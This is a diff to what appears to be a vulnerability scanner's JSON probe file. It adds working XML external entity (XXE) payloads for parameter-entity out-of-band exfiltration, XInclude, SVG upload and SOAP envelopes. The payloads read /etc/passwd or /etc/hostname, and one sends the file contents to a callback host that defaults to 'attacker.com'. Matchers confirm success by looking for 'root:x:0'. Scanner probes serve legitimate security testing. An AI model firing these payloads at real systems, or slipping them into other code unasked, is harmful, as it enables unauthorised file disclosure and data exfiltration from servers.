@@ -78,6 +78,63 @@
           "confidence_boost": 25
         }
       ]
+    },
+    "parameter_entity": {
+      "description": "Parameter entity XXE for OOB exfiltration — two-stage with external DTD",
+      "tech_match": ["Java", "PHP", ".NET"],
+      "param_match": ["xml", "data", "payload", "soap"],
+      "probes": [
+        {
+          "payload": "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY exfil SYSTEM 'http://{{callback}}/?data=%xxe;'>\">%eval;%exfil;]><foo>test</foo>",
+          "description": "Parameter entity chained exfiltration — reads /etc/passwd and sends to collaborator",
+          "matchers": [{"type": "status", "status": [200, 400, 500]}],
+          "severity": "critical",
+          "confidence_boost": 45,
+          "variables": {"callback": "attacker.com"}
+        }
+      ]
+    },
+    "xinclude": {
+      "description": "XInclude attack — XXE when DOCTYPE cannot be controlled (e.g., server-side XML merge)",
+      "tech_match": ["Java", ".NET"],
+      "param_match": ["xml", "data", "content"],
+      "probes": [
+        {
+          "payload": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
+          "description": "XInclude file read — works when attacker controls XML value inserted into server-parsed document",
+          "matchers": [{"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}],
+          "severity": "critical",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "svg_xxe": {
+      "description": "XXE via SVG file upload — XML parser processes uploaded SVG",
+      "tech_match": [],
+      "param_match": ["file", "upload", "image", "svg", "attachment"],
+      "probes": [
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>",
+          "description": "XXE via SVG upload — hostname disclosure if server renders/parses the SVG",
+          "matchers": [{"type": "status", "status": [200]}, {"type": "regex", "pattern": "[a-zA-Z0-9\\-]+"}],
+          "severity": "high",
+          "confidence_boost": 40
+        }
+      ]
+    },
+    "soap_xxe": {
+      "description": "XXE embedded in SOAP envelope — SOAP endpoints often use XML parsers with XXE enabled",
+      "tech_match": ["Java", ".NET", "SOAP", "WCF"],
+      "param_match": ["soap", "xml", "wsdl", "envelope"],
+      "probes": [
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>",
+          "description": "XXE in SOAP envelope body — triggers if SOAP parser has external entities enabled",
+          "matchers": [{"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}],
+          "severity": "critical",
+          "confidence_boost": 50
+        }
+      ]
     }
   }
 }
